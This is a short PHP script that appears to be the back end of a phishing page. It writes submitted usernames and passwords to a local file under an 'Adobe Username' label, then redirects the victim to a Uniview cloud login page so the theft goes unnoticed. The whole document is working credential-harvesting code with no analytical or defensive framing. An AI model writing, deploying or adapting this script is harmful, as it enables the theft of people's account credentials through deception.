<?php

file_put_contents("usernames.txt", "Adobe Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://global.ezcloud.uniview.com/login');
exit();
?>
